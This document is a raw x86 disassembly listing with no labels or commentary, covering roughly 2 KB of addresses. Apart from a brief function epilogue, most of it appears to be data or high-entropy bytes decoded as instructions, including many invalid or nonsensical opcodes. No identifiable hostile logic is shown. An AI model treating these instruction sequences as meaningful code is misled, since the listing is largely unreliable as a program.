  4210f4:	addr16 push ss
  4210f6:	cwde   
  4210f7:	sti    
  4210f8:	pushf  
  4210f9:	xchg   edx,eax
  4210fa:	push   ebp
  4210fb:	push   ecx
  4210fc:	(bad)  
  4210fe:	or     eax,0x63a8b877
  421103:	in     al,0x75
  421105:	gs ret 0x9e10
  421109:	inc    esp
  42110a:	mov    cl,0xc2
  42110c:	fucomp st(0)
  42110e:	push   esp
  42110f:	sar    al,cl
  421111:	adc    DWORD PTR [edx],0x2123c2d7
  421117:	(bad)  
  421118:	push   edi
  421119:	out    dx,eax
  42111a:	sub    bh,bh
  42111c:	jmp    0x60c48d6
  421121:	sbb    al,0x12
  421123:	arpl   di,cx
  421125:	cmp    eax,0xdcf9abf0
  42112a:	and    dl,BYTE PTR [ecx]
  42112c:	sub    edx,0xffffffb3
  42112f:	mov    ebx,0x8d2a95cd
  421134:	mov    edi,DWORD PTR [ecx]
  421136:	add    edx,edi
  421138:	mov    DWORD PTR [ecx],edx
  42113a:	mov    ecx,DWORD PTR [ebp+0x8]
  42113d:	xor    ecx,eax
  42113f:	add    ecx,esi
  421141:	jne    0x41ed92
  421147:	mov    ecx,DWORD PTR [ebp-0x8]
  42114a:	xor    ecx,eax
  42114c:	mov    eax,DWORD PTR [ebp+0x10]
  42114f:	add    ecx,esi
  421151:	mov    DWORD PTR [eax],ecx
  421153:	pop    edi
  421154:	pop    esi
  421155:	pop    ebx
  421156:	leave  
  421157:	ret    0xc
  42115a:	pop    ss
  42115b:	or     al,0x84
  42115d:	repz lahf 
  42115f:	sti    
  421160:	ja     0x42114e
  421162:	stos   BYTE PTR es:[edi],al
  421163:	mov    edx,0x4bac88e2
  421168:	pusha  
  421169:	jo     0x4211a8
  42116b:	int3   
  42116c:	add    DWORD PTR [eax],eax
  42116e:	pop    esp
  42116f:	add    BYTE PTR [eax],al
  421171:	add    BYTE PTR [esi+0x467ebd1a],ch
  421177:	test   al,0xa6
  421179:	cmp    eax,0x5ea18722
  42117e:	jae    0x421181
  421180:	pusha  
  421181:	jb     0x42117b
  421183:	sbb    esp,esp
  421185:	in     al,0x8c
  421187:	jmp    0x22e3:0x6f3ce38a
  42118e:	jb     0x4211f2
  421190:	fldenv [eax+0x1b]
  421193:	dec    eax
  421194:	pop    edi
  421195:	adc    BYTE PTR [edx],bl
  421197:	add    eax,0x163d811e
  42119c:	pop    esi
  42119d:	add    BYTE PTR [edi],ah
  42119f:	out    dx,eax
  4211a0:	dec    edi
  4211a1:	ds add eax,0x7cbe1025
  4211a7:	push   edi
  4211a8:	mov    ah,0x5c
  4211aa:	scas   al,BYTE PTR es:[edi]
  4211ab:	in     al,dx
  4211ac:	mov    eax,ds:0xb6403453
  4211b1:	jbe    0x4211d2
  4211b3:	mov    esp,0xc9b8b5a1
  4211b8:	mov    ah,0xd
  4211ba:	cs ret 
  4211bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211bd:	imul   eax,DWORD PTR [esi],0x441cb7eb
  4211c3:	push   ebp
  4211c4:	xchg   edi,eax
  4211c5:	pop    eax
  4211c6:	jo     0x4211a5
  4211c8:	dec    ebx
  4211c9:	fadd   QWORD PTR [esi+0x54df0b]
	...
  4211d7:	add    BYTE PTR [eax],al
  4211d9:	add    cl,dl
  4211db:	sub    al,0x14
  4211dd:	adc    edi,ebp
  4211df:	cmp    edx,edi
  4211e1:	out    dx,al
  4211e2:	pop    edi
  4211e3:	xchg   bx,ax
  4211e5:	push   0xf1448bc2
  4211ea:	cdq    
  4211eb:	int3   
  4211ec:	add    DWORD PTR [eax],eax
  4211ee:	pop    esp
  4211ef:	add    BYTE PTR [eax],al
  4211f1:	add    BYTE PTR [edx],al
  4211f3:	sub    al,0xb5
  4211f5:	mov    edi,0x8c7405e1
  4211fa:	xor    al,0x72
  4211fc:	inc    ebx
  4211fd:	test   edi,0x41295c62
  421203:	or     dh,BYTE PTR [esi+0x68]
  421206:	lds    ecx,FWORD PTR [eax]
  421208:	xchg   ebp,eax
  421209:	mov    cl,0x82
  42120b:	dec    ebp
  42120c:	aas    
  42120d:	add    ch,BYTE PTR [eax-0x3a0cc2c1]
  421213:	sar    esp,cl
  421215:	add    BYTE PTR [esi+0xbb6fe19],0x0
  42121c:	push   edx
  42121d:	adc    edx,DWORD PTR ds:0xc0f26c8b
  421224:	fldcw  WORD PTR [ecx+0x40]
  421227:	je     0x421295
  421229:	mov    ds:0xcd9482f4,eax
  42122e:	hlt    
  42122f:	arpl   WORD PTR [edx+edx*2-0x7],si
  421233:	add    BYTE PTR [ecx-0x47e36e33],dl
  421239:	dec    ebx
  42123a:	mov    dl,0xee
  42123c:	lods   al,BYTE PTR ds:[esi]
  42123d:	je     0x4212bd
  42123f:	cdq    
  421240:	div    BYTE PTR [eax+edx*2]
  421243:	jp     0x421222
  421245:	test   BYTE PTR [ebx+edx*8],bh
  421248:	or     BYTE PTR [ebp+0x9],dl
  42124b:	push   ebx
  42124c:	jg     0x42123c
	...
  42125a:	pop    ds
  42125b:	sub    esp,DWORD PTR [eax-0x60404bc1]
  421261:	sub    eax,esi
  421263:	add    BYTE PTR [edi+eax*2-0x6b270cb9],0xf5
  42126b:	int3   
  42126c:	add    DWORD PTR [eax],eax
  42126e:	pop    esp
  42126f:	add    BYTE PTR [eax],al
  421271:	add    BYTE PTR [edi+0x5457ef51],cl
  421277:	sub    BYTE PTR [edx+ecx*1],al
  42127a:	test   al,0xfc
  42127c:	inc    edx
  42127d:	cdq    
  42127e:	sahf   
  42127f:	mov    dh,0x9d
  421281:	mov    ss,WORD PTR [esi]
  421283:	pop    ebp
  421284:	sbb    al,0x4
  421286:	mov    al,0x7c
  421288:	xchg   edx,eax
  421289:	or     al,0xf7
  42128b:	call   0x30786208
  421290:	pop    ds
  421291:	js     0x4212f6
  421293:	xor    ah,BYTE PTR [edx+edi*8]
  421296:	addr16 pushf 
  421298:	stc    
  421299:	and    eax,eax
  42129b:	push   ecx
  42129c:	aaa    
  42129d:	gs popa 
  42129f:	test   DWORD PTR [ebx-0x4e],esi
  4212a2:	mov    ds:0x5e39d2d,eax
  4212a7:	xchg   ebx,eax
  4212a8:	rcr    DWORD PTR [eax],0x81
  4212ab:	mov    ds:0x596a0e6d,eax
  4212b0:	stc    
  4212b1:	stos   DWORD PTR es:[edi],eax
  4212b2:	call   0xefbd293a
  4212b7:	push   ecx
  4212b8:	test   al,0x4a
  4212ba:	jecxz  0x42124d
  4212bc:	xor    BYTE PTR [eax],bh
  4212be:	seta   BYTE PTR [edi]
  4212c1:	dec    eax
  4212c2:	rcr    BYTE PTR [ebp-0x5d],1
  4212c5:	icebp  
  4212c6:	shl    DWORD PTR [ebx],cl
  4212c8:	pop    ss
  4212c9:	arpl   WORD PTR [ebx+0x1f],ax
  4212cc:	xor    DWORD PTR [eax+eax*1],esi
	...
  4212d7:	add    BYTE PTR [eax],al
  4212d9:	add    BYTE PTR [edi],ch
  4212db:	and    al,0xf0
  4212dd:	aam    0xfb
  4212df:	aam    0x2f
  4212e1:	jmp    FWORD PTR [esi+0x33]
  4212e4:	je     0x42129c
  4212e6:	jmp    0x4212c4
  4212e8:	dec    edi
  4212e9:	scas   eax,DWORD PTR es:[edi]
  4212ea:	push   ecx
  4212eb:	int    0x1
  4212ed:	add    BYTE PTR [eax+eax*1+0x0],bl
  4212f1:	add    bh,bh
  4212f3:	pop    esi
  4212f4:	sub    al,0xd8
  4212f6:	sub    ebx,DWORD PTR [esi-0x80023a2]
  4212fc:	add    eax,0xea34f327
  421301:	mov    dh,0x72
  421303:	cmp    ch,al
  421305:	aaa    
  421306:	or     BYTE PTR [ebp-0x22],0xca
  42130a:	fcom   QWORD PTR [ecx]
  42130c:	jp     0x421307
  42130e:	imul   ebx,DWORD PTR [eax-0x627275f2],0x4e
  421315:	lock js 0x4212a8
  421318:	xchg   ebp,eax
  421319:	inc    edi
  42131a:	jo     0x421373
  42131c:	dec    edx
  42131d:	adc    eax,0x34def162
  421322:	rcr    eax,cl
  421324:	int    0x1d
  421326:	rcl    ecx,1
  421328:	cld    
  421329:	sub    ebp,edi
  42132b:	rcr    BYTE PTR [edx+0x7c],0x8e
  42132f:	jae    0x4212d0
  421331:	fild   WORD PTR [esi-0x29]
  421334:	in     al,0x4d
  421336:	mov    al,0xcb
  421338:	cmp    DWORD PTR [eax+0x22],eax
  42133b:	pop    ebp
  42133c:	add    al,0x1b
  42133e:	xchg   DWORD PTR [eax+eax*1+0xe],edi
  421342:	cmc    
  421343:	mov    dl,ah
  421345:	or     eax,0x8c175ff6
  42134a:	sub    eax,0x23891a
	...
  421357:	add    BYTE PTR [eax],al
  421359:	add    dl,cl
  42135b:	mov    al,ds:0xdf7e4d76
  421360:	sti    
  421361:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421362:	mov    bh,0x83
  421364:	dec    edi
  421365:	mov    ds:0xbd689dfb,al
  42136a:	lods   eax,DWORD PTR ds:[esi]
  42136b:	int    0x1
  42136d:	add    BYTE PTR [eax+eax*1+0x0],bl
  421371:	add    al,dl
  421373:	lods   al,BYTE PTR ds:[esi]
  421374:	push   ss
  421375:	or     al,0x26
  421377:	xchg   ecx,eax
  421378:	sub    bh,BYTE PTR [edx]
  42137a:	(bad)  
  42137b:	cmp    BYTE PTR [edi+0x5f],dl
  42137e:	es mov dl,0x84
  421381:	sbb    DWORD PTR [esi],0xfffffff1
  421384:	leave  
  421385:	pop    ebx
  421386:	stos   DWORD PTR es:[edi],eax
  421387:	pminub mm6,QWORD PTR [eax]
  42138a:	lock ins BYTE PTR es:[edi],dx
  42138c:	stos   BYTE PTR es:[edi],al
  42138d:	mov    edx,0x13165c5c
  421392:	scas   eax,DWORD PTR es:[edi]
  421393:	sub    ah,BYTE PTR fs:[ecx]
  421396:	cli    
  421397:	adc    dl,ch
  421399:	std    
  42139a:	mov    fs,WORD PTR [ebp-0x3f027e8a]
  4213a0:	push   ds
  4213a1:	gs xchg edi,eax
  4213a3:	push   ds
  4213a4:	add    bh,BYTE PTR [edi+0x52]
  4213a7:	imul   edi,ecx,0x1c
  4213aa:	mov    esp,0xb60a7cd9
  4213af:	fdivr  DWORD PTR [ebx-0xbb8fcd4]
  4213b5:	mov    ebx,0x8c8c3bf0
  4213ba:	inc    esp
  4213bb:	mov    ecx,0xbbeccda
  4213c0:	mov    dh,BYTE PTR [edi]
  4213c2:	jl     0x4213c0
  4213c4:	shl    ebp,1
  4213c6:	(bad)  
  4213c7:	push   cs
  4213c8:	jbe    0x42138a
  4213ca:	mov    ah,0xc1
  4213cc:	jg     0x421388
	...
  4213da:	(bad)  
  4213db:	out    dx,al
  4213dc:	lods   al,BYTE PTR ds:[esi]
  4213dd:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  4213e4:	stc    
  4213e5:	stc    
  4213e6:	sub    eax,0x9be1b9a
  4213eb:	into   
  4213ec:	add    DWORD PTR [eax],eax
  4213ee:	pop    esp
  4213ef:	add    BYTE PTR [eax],al
  4213f1:	add    BYTE PTR [edx],al
  4213f3:	mov    bp,0xe8c5
  4213f7:	lods   al,BYTE PTR ds:[esi]
  4213f8:	xor    esi,DWORD PTR [ebx-0x4ea151d3]
  4213fe:	in     al,0x33
  421400:	adc    DWORD PTR [esi],ecx
  421402:	lods   al,BYTE PTR ds:[esi]
  421403:	adc    ah,cl
  421405:	mov    esp,0x5ae70b98
  42140a:	jp     0x42146b
  42140c:	mov    eax,0x256ebf8
  421411:	neg    BYTE PTR [edx+0x122cef7c]
  421417:	mov    eax,0x5975619c
  42141c:	mov    esi,0x6993da88
  421421:	ja     0x42140f
  421423:	sub    ecx,DWORD PTR [ecx-0x2a]
  421426:	xor    eax,esp
  421428:	mov    DWORD PTR [esi+0x61],ebx
  42142b:	and    edx,ebx
  42142d:	mov    ebp,0x310e6370
  421432:	sahf   
  421433:	xlat   BYTE PTR ds:[ebx]
  421434:	or     dh,BYTE PTR ds:[eax]
  421437:	iret   
  421438:	jle    0x42147b
  42143a:	fsubr  st(7),st
  42143c:	pop    ecx
  42143d:	push   esi
  42143e:	ds out 0xaf,al
  421441:	arpl   WORD PTR [ecx-0x64996b63],bp
  421447:	and    ecx,DWORD PTR [esi+0x79]
  42144a:	cmp    cl,ch
  42144c:	push   ecx
  42144d:	loop   0x42144f
	...
  421457:	add    BYTE PTR [eax],al
  421459:	add    BYTE PTR [edx+0x34],dl
  42145c:	inc    eax
  42145d:	gs data16 jne 0x4214d8
  421461:	aaa    
  421462:	push   0x3c6a4e09
  421467:	popa   
  421468:	in     al,dx
  421469:	aam    0x65
  42146b:	into   
  42146c:	add    DWORD PTR [eax],eax
  42146e:	pop    esp
  42146f:	add    BYTE PTR [eax],al
  421471:	add    BYTE PTR [ecx+0x4],bh
  421474:	neg    BYTE PTR [ebp-0x60]
  421477:	mov    cl,0x34
  421479:	test   BYTE PTR [eax+eax*8-0x22],0x57
  42147e:	into   
  42147f:	inc    edx
  421480:	lods   eax,DWORD PTR ds:[esi]
  421481:	icebp  
  421482:	in     al,dx
  421483:	push   eax
  421484:	mov    edi,0xa734aaaa
  421489:	dec    eax
  42148a:	cmp    eax,0xadb4f1dc
  42148f:	push   eax
  421490:	out    0x48,eax
  421492:	ins    BYTE PTR es:[edi],dx
  421493:	add    dh,BYTE PTR [ebp+ecx*4-0x369e44d1]
  42149a:	cwde   
  42149b:	aas    
  42149c:	add    DWORD PTR [edx],esi
  42149e:	lds    ebx,FWORD PTR [ebp+edx*1+0x17e41721]
  4214a5:	clc    
  4214a6:	shr    ch,cl
  4214a8:	lock mov cl,0x3f
  4214ac:	rol    ch,1
  4214ae:	jne    0x421490
  4214b0:	and    eax,0xa78c708a
  4214b5:	sbb    eax,DWORD PTR [ecx+0x18]
  4214b8:	pop    edx
  4214b9:	in     al,0x95
  4214bb:	mov    ecx,0x3b8845e1
  4214c0:	inc    ebx
  4214c1:	sub    ebp,DWORD PTR [ecx+ebx*2]
  4214c4:	lods   eax,DWORD PTR ds:[esi]
  4214c5:	and    eax,0x64656e36
  4214ca:	jnp    0x4214bb
  4214cc:	mov    cl,0xe
	...
  4214da:	adc    bh,BYTE PTR [edx-0x19073928]
  4214e0:	push   ds
  4214e1:	(bad)  
  4214e2:	adc    bl,dh
  4214e4:	cwde   
  4214e5:	out    dx,al
  4214e6:	mov    ds:0x1e8b3c0,eax
  4214eb:	loopne 0x4214ee
  4214ed:	add    BYTE PTR [eax+eax*1+0x0],bl
  4214f1:	add    BYTE PTR ds:0x590c600,bh
  4214f7:	ins    BYTE PTR es:[edi],dx
  4214f8:	jns    0x4214d6
  4214fa:	adc    BYTE PTR [edx+0x6581110a],0x65
  421501:	and    bl,cl
  421503:	es mov eax,0x95f53128
  421509:	dec    esp
  42150a:	sti    
  42150b:	stos   DWORD PTR es:[edi],eax
  42150c:	test   BYTE PTR [edi],bh
  42150e:	test   eax,0xba58cf4c
  421513:	fmulp  st(3),st
  421515:	outs   dx,BYTE PTR ds:[esi]
  421516:	mov    edi,0xd98713bf
  42151b:	fwait
  42151c:	jp     0x4214ee
  42151e:	into   
  42151f:	pop    es
  421520:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421521:	ja     0x421510
  421523:	add    al,0x52
  421525:	mov    ch,0x8f
  421527:	mov    DWORD PTR [eax+0x6a],ebp
  42152a:	pop    es
  42152b:	and    eax,0x18d97f17
  421530:	fistp  DWORD PTR [ebx-0x6d]
  421533:	jecxz  0x421585
  421535:	pusha  
  421536:	inc    ecx
  421537:	stos   BYTE PTR es:[edi],al
  421538:	leave  
  421539:	push   cs
  42153a:	leave  
  42153b:	adc    esi,ebx
  42153d:	(bad)  
  42153e:	in     eax,0xd2
  421540:	in     eax,0xea
  421542:	jbe    0x42156b
  421544:	push   ebx
  421545:	push   ebx
  421546:	mov    eax,0xaee17b5b
  42154b:	arpl   cx,dx
  42154d:	inc    edx
	...
  42155a:	dec    ecx
  42155b:	inc    esi
  42155c:	sub    BYTE PTR [eax],dh
  42155e:	das    
  42155f:	jle    0x4215ba
  421561:	jg     0x421529
  421563:	imul   esi,eax,0xffffffd5
  421566:	bound  esi,QWORD PTR [ebx]
  421568:	pop    esp
  421569:	ja     0x4215c8
  42156b:	loopne 0x42156e
  42156d:	add    BYTE PTR [eax+eax*1+0x0],bl
  421571:	add    ch,dl
  421573:	aaa    
  421574:	xchg   esp,eax
  421575:	cmp    eax,0xe6d3a871
  42157a:	fsubrp st(7),st
  42157c:	xor    ebx,esi
  42157e:	push   ss
  42157f:	dec    edi
  421580:	jg     0x4215d9
  421582:	mov    al,ds:0x2ac20f1
  421587:	dec    esi
  421588:	repnz mov bh,0x5e
  42158b:	jb     0x421601
  42158d:	ins    BYTE PTR es:[edi],dx
  42158e:	fwait
  42158f:	adc    BYTE PTR [edx+0x2a],al
  421592:	jp     0x4215e5
  421594:	rcl    BYTE PTR [ecx-0x63],cl
  421597:	test   DWORD PTR [esi-0x61e4ea7d],ebx
  42159d:	ret    
  42159e:	inc    ecx
  42159f:	sbb    DWORD PTR [esi],esi
  4215a1:	ret    0x16de
  4215a4:	shl    DWORD PTR [edi+0x9],1
  4215a7:	push   es
  4215a8:	das    
  4215a9:	aaa    
  4215aa:	add    BYTE PTR [ebp-0x78],ch
  4215ad:	ins    BYTE PTR es:[edi],dx
  4215ae:	(bad)  
  4215af:	(bad)  
  4215b0:	jns    0x4215c2
  4215b2:	fmul   QWORD PTR [ebx+eiz*2-0x12a1a69b]
  4215b9:	call   0xbc50427c
  4215be:	int    0xf4
  4215c0:	fadd   st(5),st
  4215c2:	sub    eax,DWORD PTR [ecx+0x45]
  4215c5:	xor    ch,bl
  4215c7:	push   ds
  4215c8:	call   0x824760bc
  4215cd:	cwde   
	...
  4215da:	addr16 (bad) 
  4215dc:	and    dh,dh
  4215de:	mov    eax,ds:0xe7d7f7f6
  4215e3:	mov    eax,0x7a87da72
  4215e8:	fcom   QWORD PTR [esi]
  4215ea:	mov    ecx,0x5c0001e0
  4215ef:	add    BYTE PTR [eax],al
  4215f1:	add    bh,al
  4215f3:	scas   al,BYTE PTR es:[edi]
  4215f4:	icebp  
  4215f5:	out    0xfd,eax
  4215f7:	ret    
  4215f8:	pop    esi
  4215f9:	and    al,al
  4215fb:	addr16 in al,dx
  4215fd:	ret    
  4215fe:	sbb    ah,ah
  421600:	clc    
  421601:	scas   eax,DWORD PTR es:[edi]
  421602:	or     edi,DWORD PTR [ebp+eiz*8-0x7c]
  421606:	xor    DWORD PTR [eax+0x22],0x9631e62f
  42160d:	les    edx,FWORD PTR [edi+0x47e79a1d]
  421613:	inc    esi
  421614:	mov    ebp,DWORD PTR [ebx-0x4cb30ca1]
  42161a:	push   es
  42161b:	nop
  42161c:	or     al,0x4
  42161e:	pop    eax
  42161f:	jnp    0x42164f
  421621:	call   0x32b073fe
  421626:	dec    eax
  421627:	adc    DWORD PTR [edi],0xfffffff2
  42162a:	dec    esp
  42162b:	inc    edx
  42162c:	jecxz  0x421630
  42162e:	addr16 (bad) 
  421630:	adc    al,0xf0
  421632:	repnz ds (bad) 
  421636:	rcr    BYTE PTR [esi+0x64],0xd6
  42163a:	loope  0x4215c7
  42163c:	mov    ch,0x60
  42163e:	lods   al,BYTE PTR ds:[esi]
  42163f:	jg     0x421696
  421641:	aam    0xdd
  421643:	add    BYTE PTR [esp+ecx*8-0x73e4e939],dh
  42164a:	and    DWORD PTR [esi+0xa1b2],esi
	...
  421658:	add    BYTE PTR [eax],al
  42165a:	ret    
  42165b:	or     eax,0xefee66a6
  421660:	ret    
  421661:	lods   eax,DWORD PTR ds:[esi]
  421662:	sub    al,0xb8
  421664:	mov    ds:0x5ece7d47,eax
  421669:	dec    ebx
  42166a:	adc    eax,0x5c0001e1
  42166f:	add    BYTE PTR [eax],al
  421671:	add    dl,dh
  421673:	cld    
  421674:	add    al,0xa4
  421676:	std    
  421677:	inc    esp
  421678:	sbb    DWORD PTR [ebx+0x11],ebp
  42167b:	sub    ebx,ebp
  42167d:	fldcw  WORD PTR [edi]
  42167f:	inc    edx
  421680:	dec    ebp
  421681:	and    BYTE PTR [ebx+0x2b],ah
  421684:	add    al,BYTE PTR [eax]
  421686:	adc    BYTE PTR [edx],cl
  421688:	or     eax,0x84794b09
  42168d:	lods   eax,DWORD PTR ds:[esi]
  42168e:	int3   
  42168f:	popf   
  421690:	cmp    al,0x9e
  421692:	jmp    0x421621
  421694:	adc    edx,0x25
  421697:	push   edx
  421698:	icebp  
  421699:	or     eax,0xf8ca6898
  42169e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42169f:	stc    
  4216a0:	sbb    BYTE PTR [ecx+0x32a70d9c],bl
  4216a6:	lds    ecx,FWORD PTR [edx]
  4216a8:	inc    ebp
  4216a9:	mov    ebp,0xd737d955
  4216ae:	in     al,0x37
  4216b0:	cld    
  4216b1:	pop    ecx
  4216b2:	pop    edi
  4216b3:	stos   BYTE PTR es:[edi],al
  4216b4:	mov    bl,0x82
  4216b6:	loop   0x4216cf
  4216b8:	adc    DWORD PTR ds:0x1f142e77,eax
  4216be:	das    
  4216bf:	mov    ch,0xae
  4216c1:	stc    
  4216c2:	mov    esi,0x6603fd5c
  4216c7:	and    ebx,DWORD PTR [edi-0x3aa1b31e]
  4216cd:	les    eax,FWORD PTR [eax]
	...
  4216d7:	add    BYTE PTR [eax],al
  4216d9:	add    cl,bl
  4216db:	ret    0x4905
  4216de:	pop    ds
  4216df:	iret   
  4216e0:	fst    st(2)
  4216e2:	enter  0xf86f,0xd2
  4216e6:	jmp    0x1e1:0x71e5ddf5
  4216ed:	add    BYTE PTR [ebx+0x0],al
  4216f0:	add    BYTE PTR [eax],al
  4216f2:	mov    al,ds:0xfe724814
  4216f7:	add    DWORD PTR [ecx-0x3e],ecx
  4216fa:	dec    ebx
  4216fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4216fc:	mov    eax,0xeecbb0d8
  421701:	pop    ecx
  421702:	xor    DWORD PTR [ebp-0x5c53185d],esi
  421708:	dec    edi
  421709:	pushf  
  42170a:	mov    ah,0x97
  42170c:	push   eax
  42170d:	fbstp  TBYTE PTR [edx-0xf]
  421710:	sbb    edx,DWORD PTR [ecx+0x78daf3ec]
  421716:	dec    esi
  421717:	retf   0x53e8
  42171a:	out    dx,eax
  42171b:	jge    0x4216c2
  42171d:	stos   DWORD PTR es:[edi],eax
  42171e:	mov    ds:0x5c945323,eax
  421723:	add    DWORD PTR ds:0xeba044cf,edx
  421729:	mov    bh,0x36
  42172b:	ret    
  42172c:	push   edx
  42172d:	gs je  0x421771
  421730:	gs jge 0x42179b
  421733:	mov    ds:0x14,eax
  421738:	add    BYTE PTR [eax],al
  42173a:	add    BYTE PTR [eax-0x6ffbffbe],dl
  421740:	inc    edx
  421741:	add    BYTE PTR [eax],cl
  421743:	nop
  421744:	inc    edx
  421745:	add    BYTE PTR [eax+edx*4],cl
  421748:	inc    edx
  421749:	add    BYTE PTR [eax],dl
  42174b:	nop
  42174c:	inc    edx
  42174d:	add    BYTE PTR [eax+edx*4],dl
  421750:	inc    edx
  421751:	add    BYTE PTR [eax],bl
  421753:	nop
  421754:	inc    edx
  421755:	add    BYTE PTR [eax+edx*4],bl
  421758:	inc    edx
  421759:	add    BYTE PTR [eax],al
  42175b:	mov    al,ds:0xa0040042
  421760:	inc    edx
  421761:	add    BYTE PTR [eax],cl
  421763:	mov    al,ds:0xa00c0042
  421768:	inc    edx
  421769:	add    BYTE PTR [eax],dl
  42176b:	mov    al,ds:0xa0140042
  421770:	inc    edx
  421771:	add    BYTE PTR [eax],bl
  421773:	mov    al,ds:0xa01c0042
  421778:	inc    edx
  421779:	add    BYTE PTR [eax],al
  42177b:	mov    al,0x42
  42177d:	add    BYTE PTR [eax+esi*4],al
  421780:	inc    edx
  421781:	add    BYTE PTR [eax],cl
  421783:	mov    al,0x42
  421785:	add    BYTE PTR [eax+esi*4],cl
  421788:	inc    edx
  421789:	add    BYTE PTR [eax],dl
  42178b:	mov    al,0x42
  42178d:	add    BYTE PTR [eax+esi*4],dl
  421790:	inc    edx
  421791:	add    BYTE PTR [eax],bl
  421793:	mov    al,0x42
  421795:	add    BYTE PTR [eax+esi*4],bl
  421798:	inc    edx
  421799:	add    BYTE PTR [eax+0x66],bh
  42179c:	ins    BYTE PTR es:[edi],dx
  42179d:	jp     0x4217f6
  42179f:	jbe    0x4217e8
  4217a1:	ja     0x4217e6
  4217a3:	js     0x4217ed
  4217a5:	jno    0x42180a
  4217a7:	inc    edx
  4217a8:	inc    bx
  4217aa:	push   ebp
  4217ab:	jno    0x421823
  4217ad:	ja     0x421816
  4217af:	dec    edi
  4217b0:	dec    esp
  4217b1:	dec    ebp
  4217b2:	inc    edx
  4217b3:	jno    0x421826
  4217b5:	jae    0x42180a
  4217b7:	push   eax
  4217b8:	arpl   WORD PTR [ebx+0x62],dx
  4217bb:	sbb    eax,DWORD PTR [edx+0x0]
  4217be:	push   0x1b
  4217c0:	inc    edx
  4217c1:	add    BYTE PTR [edx],al
  4217c3:	sbb    al,BYTE PTR [edx+0x0]
  4217c6:	out    dx,eax
  4217c7:	or     esi,DWORD PTR [edx+0x304e790e]
  4217cd:	dec    esi
  4217ce:	xchg   DWORD PTR [edi+0x3d],ecx
  4217d1:	dec    esi
  4217d2:	scas   eax,DWORD PTR es:[edi]
  4217d3:	dec    edi
  4217d4:	ds dec esi
  4217d6:	js     0x421826
  4217d8:	cmp    ecx,DWORD PTR [esi-0x64]
  4217db:	dec    edi
  4217dc:	inc    esp
  4217dd:	dec    esi
  4217de:	jae    0x42182e
  4217e0:	inc    ecx
  4217e1:	dec    esi
  4217e2:	xor    BYTE PTR [esi+0x40],cl
  4217e5:	dec    esi
  4217e6:	pop    esp
  4217e7:	pop    ebp
  4217e8:	pop    edi
  4217e9:	push   edx
  4217ea:	cmp    DWORD PTR [esi+0x79],ecx
  4217ed:	dec    esi
  4217ee:	xor    BYTE PTR [esi-0x79],cl
  4217f1:	dec    edi
  4217f2:	cmp    eax,0x3e4faf4e
  4217f7:	dec    esi
  4217f8:	js     0x421848
  4217fa:	cmp    ecx,DWORD PTR [esi-0x64]
  4217fd:	dec    edi
  4217fe:	inc    esp
  4217ff:	dec    esi
  421800:	mov    DWORD PTR [edi+0x41],ecx
  421803:	dec    esi
  421804:	xor    BYTE PTR [esi+0x40],cl
  421807:	dec    esi
  421808:	pop    esp
  421809:	ins    DWORD PTR es:[edi],dx
  42180a:	pop    edi
  42180b:	bound  edi,QWORD PTR [ecx]
  42180d:	dec    esi
  42180e:	jns    0x42185e
  421810:	xor    BYTE PTR [esi-0x80],cl
  421813:	dec    edi
  421814:	cmp    eax,0x394e734e
  421819:	dec    esi
  42181a:	mov    ds:0x304e3a4f,al
  42181f:	dec    esi
  421820:	inc    esi
  421821:	dec    esi
  421822:	pop    esp
  421823:	jge    0x421884
  421825:	jb     0x421896
  421827:	sub    BYTE PTR [esi-0x7d],0x7e
  42182b:	xchg   ebx,eax
  42182c:	jns    0x4217be
  42182e:	aas    
  42182f:	dec    esi
  421830:	test   BYTE PTR [edi+0x30],cl
  421833:	dec    esi
  421834:	test   BYTE PTR [edi+0x3c],cl
  421837:	dec    esi
  421838:	mov    ds:0x734e394f,al
  42183d:	dec    esi
  42183e:	inc    ebp
  42183f:	dec    esi
  421840:	xor    BYTE PTR [esi+0x44],cl
  421843:	dec    esi
  421844:	pop    esp
  421845:	lea    ebx,[edi-0x7e]
  421848:	outs   dx,DWORD PTR ds:[esi]
  421849:	xchg   edx,eax
  42184a:	outs   dx,BYTE PTR ds:[esi]
  42184b:	xchg   ebx,eax
  42184c:	jle    0x4217f1
  42184e:	jns    0x4217f0
  421850:	aas    
  421851:	dec    esi
  421852:	test   BYTE PTR [edi+0x30],cl
  421855:	dec    esi
  421856:	test   BYTE PTR [edi+0x3c],cl
  421859:	dec    esi
  42185a:	mov    ds:0x894e394f,al
  42185f:	dec    edi
  421860:	inc    ebp
  421861:	dec    esi
  421862:	xor    BYTE PTR [esi+0x44],cl
  421865:	dec    esi
  421866:	pop    esp
  421867:	popf   
  421868:	pop    edi
  421869:	xchg   edx,eax
  42186a:	outs   dx,DWORD PTR ds:[esi]
  42186b:	mov    ds:0xb37ea36e,al
  421870:	jns    0x421822
  421872:	aas    
  421873:	dec    esi
  421874:	mov    cs,WORD PTR [edi+0x30]
  421877:	dec    esi
  421878:	lods   al,BYTE PTR ds:[esi]
  421879:	dec    edi
  42187a:	cmp    eax,0x394e734e
  42187f:	dec    esi
  421880:	mov    eax,ds:0x304e3a4f
  421885:	dec    esi
  421886:	inc    esp
  421887:	dec    esi
  421888:	pop    esp
  421889:	lods   eax,DWORD PTR ds:[esi]
  42188a:	pop    edi
  42188b:	mov    ds:0xb36eb26f,al
  421890:	jle    0x421855
  421892:	jns    0x421854
  421894:	aas    
  421895:	dec    esi
  421896:	mov    cs,WORD PTR [edi+0x30]
  421899:	dec    esi
  42189a:	lods   al,BYTE PTR ds:[esi]
  42189b:	dec    edi
  42189c:	cmp    eax,0x394e7e4e
  4218a1:	dec    esi
  4218a2:	lahf   
  4218a3:	dec    edi
  4218a4:	cmp    ecx,DWORD PTR [esi+0x30]
  4218a7:	dec    esi
  4218a8:	inc    ebp
  4218a9:	dec    esi
  4218aa:	pop    esp
  4218ab:	mov    ebp,0xc26fb25f
  4218b0:	outs   dx,BYTE PTR ds:[esi]
  4218b1:	ret    
  4218b2:	jle    0x421887
  4218b4:	jns    0x421886
  4218b6:	aas    
  4218b7:	dec    esi
  4218b8:	mov    cs,WORD PTR [edi+0x30]
  4218bb:	dec    esi
  4218bc:	lods   al,BYTE PTR ds:[esi]
  4218bd:	dec    edi
